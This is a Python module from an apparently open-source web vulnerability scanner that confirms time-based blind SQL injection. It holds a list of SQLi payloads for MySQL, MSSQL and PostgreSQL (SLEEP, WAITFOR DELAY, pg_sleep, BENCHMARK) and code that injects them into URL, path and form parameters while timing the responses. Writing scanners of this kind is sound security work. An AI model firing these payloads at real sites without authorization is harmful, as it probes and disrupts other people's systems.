"""
Pythia Time-Based Blind SQL Injection Detection
===============================================

Author: Rodney Dhavid Jimenez Chacin (rodhnin)
License: MIT
"""
import time
from typing import List, Dict, Optional, Tuple
from datetime import datetime, timezone
from statistics import mean, stdev
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ..core.logging import get_logger
from ..core.config import get_config
from .forms import FormTester

logger = get_logger(__name__)


class TimeBasedDetector:
    """
    Time-based blind SQL injection detector.
    
    REQUIRES AGGRESSIVE MODE (verified consent)
    
    Supports:
    - MySQL: SLEEP(n)
    - MSSQL: WAITFOR DELAY '0:0:n'
    - PostgreSQL: pg_sleep(n)
    """
    
    def __init__(self, config, http_client, auto_csrf: bool = False):
        """
        Initialize time-based detector.
        
        Args:
            config: Configuration object
            http_client: HTTP client for requests
            auto_csrf: Enable automatic CSRF token extraction
        """
        self.config = config
        self.http = http_client
        self.auto_csrf = auto_csrf
        self.form_tester = FormTester(config, http_client, auto_csrf)
        
        # Load payloads
        self.payloads = self._get_payloads()
        
        # Time settings
        self.time_threshold = 2.5  # Must exceed baseline by this much (seconds)
        self.expected_delay = 3.0   # Expected delay in payloads
        self.baseline_samples = 3   # Number of baseline measurements
        self.verification_tests = 2 # Number of verification tests
        
        logger.info(f"Time-based detector initialized")
        logger.info(f"  Payloads: {len(self.payloads)}")
        logger.info(f"  Time threshold: {self.time_threshold}s")
        logger.info(f"  Expected delay: {self.expected_delay}s")
        logger.warning(f"⚠️  TIME-BASED TESTING IS AGGRESSIVE - Server delays will occur")
    
    def _get_payloads(self) -> List[Dict[str, str]]:
        """
        Get time-based payloads with metadata.
        
        Returns:
            List of payload dictionaries with 'payload' and 'dbms' keys
        """
        return [
            # ================================================================
            # MySQL / MariaDB - STACKED QUERIES (most reliable)
            # ================================================================
            # These execute SLEEP as a separate statement, guaranteeing single execution
            {'payload': "'; SELECT SLEEP(3)-- ", 'dbms': 'MySQL'},
            {'payload': "; SELECT SLEEP(3)-- ", 'dbms': 'MySQL'},
            {'payload': "' ; SELECT SLEEP(3)-- ", 'dbms': 'MySQL'},
            
            # ================================================================
            # MySQL / MariaDB - IF-based (single execution, context-dependent)
            # ================================================================
            # IF ensures SLEEP executes once per row, but more reliable than subquery
            {'payload': "' AND IF(1=1, SLEEP(3), 0)-- ", 'dbms': 'MySQL'},
            {'payload': " AND IF(1=1, SLEEP(3), 0)-- ", 'dbms': 'MySQL'},
            {'payload': "' OR IF(1=1, SLEEP(3), 0)-- ", 'dbms': 'MySQL'},
            
            # ================================================================
            # MySQL / MariaDB - Simple SLEEP (for numeric contexts)
            # ================================================================
            {'payload': " AND SLEEP(3)-- ", 'dbms': 'MySQL'},
            {'payload': "' AND SLEEP(3)-- ", 'dbms': 'MySQL'},
            {'payload': " AND SLEEP(3)#", 'dbms': 'MySQL'},
            
            # ================================================================
            # MySQL / MariaDB - BENCHMARK alternative (for old MySQL versions)
            # ================================================================
            # Uses CPU-intensive operation instead of sleep
            {'payload': "' AND BENCHMARK(5000000, SHA1('a'))-- ", 'dbms': 'MySQL'},
            {'payload': " AND BENCHMARK(5000000, SHA1('a'))-- ", 'dbms': 'MySQL'},
            
            # ================================================================
            # Microsoft SQL Server
            # ================================================================
            {'payload': "' WAITFOR DELAY '0:0:3'-- ", 'dbms': 'MSSQL'},
            {'payload': " WAITFOR DELAY '0:0:3'-- ", 'dbms': 'MSSQL'},
            {'payload': "'; WAITFOR DELAY '0:0:3'-- ", 'dbms': 'MSSQL'},
            
            # ================================================================
            # PostgreSQL
            # ================================================================
            # pg_sleep is more reliable than subquery in WHERE
            {'payload': "'; SELECT pg_sleep(3)-- ", 'dbms': 'PostgreSQL'},
            {'payload': "; SELECT pg_sleep(3)-- ", 'dbms': 'PostgreSQL'},
            {'payload': "' AND pg_sleep(3)-- ", 'dbms': 'PostgreSQL'},
            {'payload': " AND pg_sleep(3)-- ", 'dbms': 'PostgreSQL'},
        ]
    
    def extract_vulnerable_targets_from_findings(
        self, 
        previous_findings: List[Dict]
    ) -> List[Dict]:
        """Extract testable targets from previous detection phases."""
        targets = []
        seen = set()
        
        for finding in previous_findings:
            detection_method = finding.get('detection_method', '')
            if detection_method not in ['error-based', 'boolean-blind']:
                continue
            
            evidence = finding.get('evidence', {})
            
            url = evidence.get('url', '')
            parameter = evidence.get('parameter', '')
            method = evidence.get('method', 'GET')
            original_value = evidence.get('original_value', evidence.get('value', '1'))
            
            # ================================================================
            # EXTRACT PATH PARAM METADATA
            # ================================================================
            is_path_param = evidence.get('is_path_param', False)
            param_position = evidence.get('param_position')
            path_template = evidence.get('path_template')
            
            if is_path_param and param_position is not None:
                # Parse URL correctamente
                parsed = urlparse(url)
                
                # Split path into parts
                path_parts = parsed.path.rstrip('/').split('/')
                
                # Adjust for the fact that split('/') on '/post/5' gives ['', 'post', '5']
                actual_position = param_position + 1
                
                # Reemplazar la parte contaminada con el valor original
                if actual_position < len(path_parts):
                    path_parts[actual_position] = str(original_value)
                
                # Reconstruir path limpio
                clean_path = '/'.join(path_parts)
                
                # Reconstruir URL completo
                clean_parsed = parsed._replace(path=clean_path)
                url = urlunparse(clean_parsed)
                
                logger.debug(f"  🧹 Cleaned path param URL: {url}")
            
            if not is_path_param:
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query, keep_blank_values=True)
                
                if query_params:
                    # Flatten params and clean the target param
                    clean_params = {}
                    for k, v in query_params.items():
                        if k == parameter:
                            # Use original clean value for the target param
                            clean_params[k] = original_value
                        else:
                            # Keep other params as-is
                            clean_params[k] = v[0] if isinstance(v, list) and len(v) > 0 else v
                    
                    # Rebuild clean query string
                    new_query = urlencode(clean_params, doseq=False)
                    
                    # Rebuild clean URL
                    clean_parsed = parsed._replace(query=new_query)
                    url = urlunparse(clean_parsed)
                    
                    logger.debug(f"  🧹 Cleaned query params URL: {url}")
            
            parsed_url = urlparse(url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            
            target_key = (base_url, parameter, method)
            
            if target_key in seen:
                logger.debug(
                    f"Skipping duplicate target: {method} {base_url} "
                    f"(param={parameter})"
                )
                continue
            
            seen.add(target_key)
            
            target = {
                'url': url,
                'target_param': parameter,
                'target_value': original_value,
                'method': method,
                'source_detection': detection_method,
                'confidence_boost': finding.get('confidence', 'medium'),
                'is_path_param': is_path_param,
                'param_position': param_position,
                'path_template': path_template,
                'form': evidence.get('form')
            }
            
            targets.append(target)
            
            if is_path_param:
                logger.debug(
                    f"Added target: {method} {base_url} "
                    f"(path param={parameter} at position {param_position})"
                )
            else:
                logger.debug(
                    f"Added target: {method} {base_url} "
                    f"(param={parameter}, value={original_value})"
                )
        
        logger.info(f"Extracted {len(targets)} unique targets")
        return targets
    
    def measure_baseline(
        self, 
        url: str, 
        method: str = 'GET',
        post_data: Optional[Dict] = None
    ) -> Tuple[float, float, bool]:
        """
        Measure baseline response time with multiple samples.
        
        Args:
            url: Full URL to test (for GET) or base URL (for POST)
            method: HTTP method
            post_data: POST data dictionary (only for POST requests)
        
        Returns:
            Tuple of (mean_time, stdev_time, success)
        """
        times = []
        
        logger.debug(f"Measuring baseline ({self.baseline_samples} samples)...")
        
        for i in range(self.baseline_samples):
            try:
                start = time.time()
                
                if method == 'GET':
                    response = self.http.get(url)
                else:

                    response = self.http.post(url, data=post_data)
                
                elapsed = time.time() - start
                times.append(elapsed)
                
                logger.debug(f"  Sample {i+1}: {elapsed:.3f}s")
            
            except Exception as e:
                logger.error(f"Baseline measurement failed: {e}")
                continue
        
        if len(times) < 2:
            logger.error("Failed to collect enough baseline samples")
            return (0.0, 0.0, False)
        
        mean_time = mean(times)
        stdev_time = stdev(times) if len(times) > 1 else 0.0
        
        logger.debug(f"Baseline: mean={mean_time:.3f}s, stdev={stdev_time:.3f}s")
        
        return (mean_time, stdev_time, True)
    
    def inject_payload_in_url(
        self, 
        url: str, 
        target_param: str, 
        target_value: str,
        payload: str,
        method: str,
        is_path_param: bool = False,
        param_position: int = None
    ) -> Tuple[str, Optional[Dict]]:
        """
        Inject time-based payload into target parameter.
        
        Args:
            url: Full URL with parameters
            target_param: Parameter to inject into
            target_value: Current value of parameter
            payload: Time-delay payload
            method: HTTP method (GET or POST)
            is_path_param: True if this is a path parameter
            param_position: Position in path (0-indexed, relative to URL path)
        
        Returns:
            Tuple of (url, post_data)
            - For GET: (url_with_injected_payload, None)
            - For POST query params: (base_url, {'param': 'injected_value'})
            - For POST path params: (url_with_injected_path, None)
        """
        # ================================================================
        # PATH PARAMETER INJECTION
        # ================================================================
        if is_path_param and param_position is not None:
            # Parse URL correctamente
            parsed = urlparse(url)
            
            # Split ONLY the path (not the entire URL)
            path_parts = parsed.path.rstrip('/').split('/')
            # path_parts = ['', 'post', '5']  ← Para /post/5
            
            # Adjust position: param_position is 0-indexed but split creates ['', 'post', '5']
            # So position 1 in the path corresponds to index 2 in the split array
            actual_position = param_position + 1
            
            # Inject payload at the correct position
            if actual_position < len(path_parts):
                path_parts[actual_position] = f"{target_value}{payload}"
            
            # Rebuild path
            injected_path = '/'.join(path_parts)
            # injected_path = '/post/5 AND SLEEP(3)-- '
            
            # Rebuild full URL (preserves scheme, netloc, query, etc.)
            injected_parsed = parsed._replace(path=injected_path)
            injected_url = urlunparse(injected_parsed)
            
            logger.debug(f"  Path param injection: {injected_url}")
            
            # Path params don't use POST data even for POST method
            return (injected_url, None)
        
        # ================================================================
        # QUERY STRING INJECTION
        # ================================================================
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        # Inject payload into target parameter
        if target_param in params:
            current_val = params[target_param][0] if isinstance(params[target_param], list) else params[target_param]
            injected_value = f"{current_val}{payload}"
        else:
            injected_value = f"{target_value}{payload}"
        
        params[target_param] = [injected_value]
        
        # Flatten params dict (convert lists to single values)
        flat_params = {}
        for k, v in params.items():
            if isinstance(v, list):
                flat_params[k] = v[0] if len(v) == 1 else v
            else:
                flat_params[k] = v
        
        if method == 'POST':
            # For POST: return base URL + data dict (to be sent in body)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            logger.debug(f"  POST injection: {base_url} with data={flat_params}")
            return (base_url, flat_params)
        else:
            # For GET: return URL with query string (as before)
            new_query = urlencode(flat_params, doseq=True)
            new_parsed = parsed._replace(query=new_query)
            injected_url = urlunparse(new_parsed)
            logger.debug(f"  GET injection: {injected_url}")
            return (injected_url, None)
    
    def test_time_delay(
        self, 
        url: str, 
        method: str,
        baseline_mean: float,
        baseline_stdev: float,
        post_data: Optional[Dict] = None
    ) -> Tuple[bool, float, str]:
        """
        Test if URL with injected payload causes time delay.
        
        Args:
            url: URL with injected time-delay payload (GET) or base URL (POST)
            method: HTTP method
            baseline_mean: Baseline mean response time
            baseline_stdev: Baseline standard deviation
            post_data: POST data dictionary (only for POST requests)
        
        Returns:
            Tuple of (is_delayed, response_time, confidence)
        """
        try:
            start = time.time()
            
            if method == 'GET':
                response = self.http.get(url)
            else:
                response = self.http.post(url, data=post_data)
            
            elapsed = time.time() - start
            
            # Calculate expected minimum delay
            # Must exceed baseline by threshold + some variance
            min_delay = baseline_mean + self.time_threshold + (baseline_stdev * 2)
            
            # Calculate how close we are to expected delay
            expected_time = baseline_mean + self.expected_delay
            time_accuracy = abs(elapsed - expected_time)
            
            logger.debug(
                f"  Response: {elapsed:.3f}s "
                f"(baseline={baseline_mean:.3f}s, "
                f"min_required={min_delay:.3f}s)"
            )
            
            # Check if we have a significant delay
            if elapsed >= min_delay:
                # Determine confidence based on accuracy
                if time_accuracy < 0.5:
                    confidence = 'high'  # Very close to expected 3s delay
                elif time_accuracy < 1.0:
                    confidence = 'medium'
                else:
                    confidence = 'low'
                
                logger.debug(f"  ✓ Time delay detected: {elapsed - baseline_mean:.3f}s increase ({confidence})")
                return (True, elapsed, confidence)
            else:
                logger.debug(f"  ✗ No significant delay detected")
                return (False, elapsed, 'none')
        
        except Exception as e:
            logger.error(f"Error testing time delay: {e}")
            return (False, 0.0, 'none')
    
    def test_target(
        self,
        target: Dict,
        payload_dict: Dict
    ) -> Optional[Dict]:
        """
        Test a single target with a time-based payload.
        """
        url = target['url']
        target_param = target['target_param']
        target_value = target['target_value']
        method = target['method']
        payload = payload_dict['payload']
        dbms = payload_dict['dbms']
        
        # ================================================================
        # GET PATH PARAM FLAGS
        # ================================================================
        is_path_param = target.get('is_path_param', False)
        param_position = target.get('param_position')
        
        logger.debug(f"Testing payload: {payload}")
        
        # ================================================================
        # Step 1: Prepare baseline URL and data 
        # ================================================================
        if method == 'POST' and not is_path_param:
            parsed = urlparse(url)
            baseline_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Use FormTester to build complete POST data
            form = target.get('form')
            
            if form:
                # Build form data with original value (includes Submit!)
                baseline_data = self.form_tester.build_form_data(
                    form=form,
                    test_field=target_param,
                    test_value=target_value,
                    csrf_token=None
                )
                logger.debug(f"  Baseline POST data (from form): {baseline_data}")
            else:
                # Fallback: extract from query string (shouldn't happen)
                logger.warning("No form object in target, using query params as fallback")
                baseline_params = parse_qs(parsed.query, keep_blank_values=True)
                flat_baseline = {}
                for k, v in baseline_params.items():
                    flat_baseline[k] = v[0] if isinstance(v, list) and len(v) > 0 else v
                baseline_data = flat_baseline
        else:
            # For GET or POST with path params
            baseline_url = url
            baseline_data = None
        
        # Step 2: Measure baseline
        baseline_mean, baseline_stdev, baseline_ok = self.measure_baseline(
            baseline_url, 
            method,
            baseline_data
        )
        
        if not baseline_ok:
            logger.error("Failed to establish baseline, skipping")
            return None
        
        # ================================================================
        # Step 3: Inject payload
        # ================================================================
        form = target.get('form')

        if method == 'POST' and form and not is_path_param:
            # Use FormTester to build complete POST data with payload
            parsed = urlparse(url)
            injected_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Construct injected value
            injected_value = f"{target_value}{payload}"
            
            # Build form data with injected value
            post_data = self.form_tester.build_form_data(
                form=form,
                test_field=target_param,
                test_value=injected_value,
                csrf_token=None
            )
            
            logger.debug(f"  POST injection with form: {injected_url}")
            logger.debug(f"  POST data: {post_data}")
        else:
            # Original method (for GET or path params)
            injected_url, post_data = self.inject_payload_in_url(
                url=url,
                target_param=target_param,
                target_value=target_value,
                payload=payload,
                method=method,
                is_path_param=is_path_param,
                param_position=param_position
            )
        
        # Step 4: Test with payload (first test)
        is_delayed_1, time_1, conf_1 = self.test_time_delay(
            injected_url,
            method,
            baseline_mean,
            baseline_stdev,
            post_data
        )
        
        if not is_delayed_1:
            return None  # No delay, not vulnerable
        
        # Step 5: Verify with second test
        logger.debug("Verifying delay (test 2/3)...")
        is_delayed_2, time_2, conf_2 = self.test_time_delay(
            injected_url,
            method,
            baseline_mean,
            baseline_stdev,
            post_data
        )
        
        if not is_delayed_2:
            logger.warning("First test showed delay but verification failed")
            return None
        
        # Step 6: Third verification test (99% confidence)
        logger.debug("Final verification (test 3/3)...")
        is_delayed_3, time_3, conf_3 = self.test_time_delay(
            injected_url,
            method,
            baseline_mean,
            baseline_stdev,
            post_data
        )
        
        if not is_delayed_3:
            logger.warning("First 2 tests showed delay but final verification failed")
            return None
        
        # ================================================================
        # All 3 tests showed delay → CONFIRMED SQLi
        # ================================================================
        logger.info(
            f"✓✓✓ TIME-BASED SQLi CONFIRMED (3/3 tests passed) "
            f"in parameter '{target_param}'"
        )
        
        # Calculate actual delays (removing baseline)
        test_delays = [
            time_1 - baseline_mean,
            time_2 - baseline_mean,
            time_3 - baseline_mean
        ]
        
        # Calculate consistency (standard deviation of delays)
        consistency_stdev = stdev(test_delays)
        
        # Determine confidence based on how consistent the delays are
        # If all 3 tests produce similar delays → high confidence
        # (regardless of whether delay is 3s, 12s, or 30s)
        if consistency_stdev < 0.5:
            final_confidence = 'high'
            logger.debug(f"  High consistency: stdev={consistency_stdev:.3f}s")
        elif consistency_stdev < 1.0:
            final_confidence = 'medium'
            logger.debug(f"  Medium consistency: stdev={consistency_stdev:.3f}s")
        else:
            final_confidence = 'low'
            logger.debug(f"  Low consistency: stdev={consistency_stdev:.3f}s")
        
        # Boost confidence if source was high confidence error-based/boolean-blind
        if target.get('confidence_boost') == 'high' and final_confidence == 'medium':
            final_confidence = 'high'
            logger.debug("  Confidence boosted to 'high' (source was high confidence)")
        
        # Create finding
        finding = self._create_finding(
            url=url,
            parameter=target_param,
            original_value=target_value,
            payload=payload,
            dbms=dbms,
            baseline_time=baseline_mean,
            test_times=[time_1, time_2, time_3],
            confidence=final_confidence,
            method=method
        )
        
        return finding
    
    def _create_finding(
        self,
        url: str,
        parameter: str,
        original_value: str,
        payload: str,
        dbms: str,
        baseline_time: float,
        test_times: List[float],
        confidence: str,
        method: str
    ) -> Dict:
        """
        Create a finding dictionary for time-based SQLi.
        
        Args:
            url: Vulnerable URL
            parameter: Vulnerable parameter
            original_value: Original parameter value
            payload: Time-delay payload
            dbms: Database type
            baseline_time: Baseline response time
            test_times: List of test response times (3 tests)
            confidence: Confidence level
            method: HTTP method
        
        Returns:
            Finding dictionary
        """
        # Calculate delays
        delays = [t - baseline_time for t in test_times]
        avg_delay = mean(delays)
        
        finding_id = 'PYTHIA-SQL-020'
        title = "Time-Based Blind SQL Injection"
        
        description = (
            f"Time-based blind SQL injection vulnerability detected in parameter '{parameter}'. "
            f"The application executed injected SQL time-delay functions (SLEEP/WAITFOR/pg_sleep), "
            f"causing consistent measurable response delays across multiple tests. "
            f"This definitively proves that SQL queries can be manipulated. "
            f"Database: {dbms}. "
            f"Baseline: {baseline_time:.3f}s, "
            f"Test delays: {delays[0]:.3f}s, {delays[1]:.3f}s, {delays[2]:.3f}s "
            f"(avg: {avg_delay:.3f}s)."
        )
        
        recommendation = (
            "Use parameterized queries (prepared statements) to prevent SQL injection. "
            "Never concatenate user input directly into SQL queries. "
            "Implement input validation and sanitization. "
            "Consider implementing query timeouts to limit impact of time-based attacks. "
            "Monitor for suspicious time-delay patterns in production."
        )
        
        evidence = {
            'type': 'time_based',
            'value': f"Confirmed time delay: {round(avg_delay, 3)}s avg (baseline: {round(baseline_time, 3)}s)",
            'method': method,
            'url': url,
            'parameter': parameter,
            'original_value': original_value,
            'payload': payload,
            'dbms': dbms,
            'baseline_time_seconds': round(baseline_time, 3),
            'test_1_time': round(test_times[0], 3),
            'test_2_time': round(test_times[1], 3),
            'test_3_time': round(test_times[2], 3),
            'avg_delay_seconds': round(avg_delay, 3),
            'consistent_delay_detected': True,
            'tests_passed': '3/3'
        }
        
        references = [
            'https://owasp.org/www-community/attacks/Blind_SQL_Injection',
            'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
            'https://portswigger.net/web-security/sql-injection/blind'
        ]
        
        finding = {
            'id': finding_id,
            'title': title,
            'description': description,
            'severity': 'critical',  # Time-based is definitive proof
            'confidence': confidence,
            'recommendation': recommendation,
            'evidence': evidence,
            'references': references,
            'affected_component': f"{method} {url} (parameter: {parameter})",
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'detection_method': 'time-based'
        }
        
        return finding
    
    def scan(
        self, 
        urls: List[Dict], 
        forms: List[Dict],
        previous_findings: List[Dict] = None
    ) -> List[Dict]:
        """
        Scan for time-based SQL injection vulnerabilities.
        
        Args:
            urls: List of URL dictionaries (IGNORED - we use previous_findings instead)
            forms: List of form dictionaries (IGNORED for now)
            previous_findings: Findings from error-based and boolean-blind phases
        
        Returns:
            List of time-based SQLi findings
        """
        findings = []
        
        logger.info("=" * 70)
        logger.info("TIME-BASED SCAN IS AGGRESSIVE")
        logger.info("  This will cause server delays during testing")
        logger.info("  Ensure you have authorization for this target")
        logger.info("=" * 70)
        
        # Check if we have previous findings
        if not previous_findings:
            logger.warning(
                "No previous findings provided. "
                "Time-based detection requires vulnerable URLs from earlier phases."
            )
            logger.warning("Skipping time-based detection.")
            return findings
        
        # Extract vulnerable targets from previous findings
        targets = self.extract_vulnerable_targets_from_findings(previous_findings)
        
        if not targets:
            logger.warning("No vulnerable targets found in previous findings")
            return findings
        
        logger.info(f"Starting time-based SQL injection scan")
        logger.info(f"  Targets from previous phases: {len(targets)}")
        logger.info(f"  Payloads to test: {len(self.payloads)}")
        logger.info(f"  This may take several minutes due to time delays...")
        
        # Test each target
        for i, target in enumerate(targets, 1):
            logger.info(
                f"Testing target {i}/{len(targets)}: "
                f"{target['method']} {target['url']} "
                f"(param={target['target_param']})"
            )
            
            # Test each payload on this target
            for payload_dict in self.payloads:
                finding = self.test_target(target, payload_dict)
                
                if finding:
                    findings.append(finding)
                    logger.info(
                        f"✓ Time-based SQLi found in parameter '{target['target_param']}' "
                        f"(DBMS: {payload_dict['dbms']})"
                    )
                    # Stop testing this target once confirmed
                    break
            
            # Small delay between targets to avoid overwhelming server
            if i < len(targets):
                time.sleep(0.5)
        
        logger.info(f"Time-based scan complete: {len(findings)} vulnerabilities found")
        
        return findings
